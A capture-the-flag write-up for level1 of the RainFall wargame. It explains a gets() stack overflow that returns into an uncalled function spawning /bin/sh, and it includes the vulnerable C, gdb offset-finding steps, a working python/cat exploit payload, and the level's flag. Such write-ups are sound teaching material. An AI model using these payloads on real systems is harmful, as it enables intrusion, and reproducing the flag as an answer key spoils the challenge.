# level1 — stack overflow, return into an unused function (ret2func)

**Teaches:** the classic `gets()` stack smash; overwriting the saved return
address. Re-read primer §2–§4.

## 1. What the binary does
Reads a line from stdin and returns. Prints nothing.

## 2. Reconstructed C
```c
void run(void) {                       // present in the binary but NEVER called
    fwrite("Good... Wait what?\n", 1, 0x13, stdout);
    system("/bin/sh");
}
void main(void) {
    char buffer[76];
    gets(buffer);                      // <-- no bounds check
}
```

## 3. The vulnerability
`gets()` reads until newline with **no size limit**, so it writes past
`buffer[76]`, over the saved EBP, and onto the saved return address. `run()`
already contains `system("/bin/sh")` but nothing calls it — we redirect
execution there.

## 4. Memory map
```
   [ buffer (76 bytes) ][ saved EBP (4) ][ saved EIP (4) ]
   |<------------------ 76 ----------->|<-- overwrite -->|
                                        put run() here
```

## 5. Step by step
1. `info functions` → `main` **and** `run`. `disassemble run` shows `system`.
2. Get `run`'s address:
   ```
   (gdb) info functions run      -> 0x08048444
   ```
3. Find the offset with a pattern:
   ```
   level1@RainFall:~$ python -c 'print "Aa0Aa1Aa2...Ag"' > /tmp/p
   (gdb) run < /tmp/p
   Program received signal SIGSEGV, 0x61616161 in ?? ()   # 'aaaa'
   ```
   Lookup → **offset 76**.

## 6. Exploit
```
python -c 'print "A"*76 + "\x44\x84\x04\x08"' > /tmp/exploit
cat /tmp/exploit - | ./level1
```
With `tools/payload.py`: offset `76`, address `0x08048444`, no shellcode.

**Why the `cat ... -`:** piping a file closes stdin at EOF, so `/bin/sh` would
exit immediately. The `-` appends *your terminal* to stdin, keeping the shell
alive so you can type `cat /home/user/level2/.pass`.

Flag → `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`
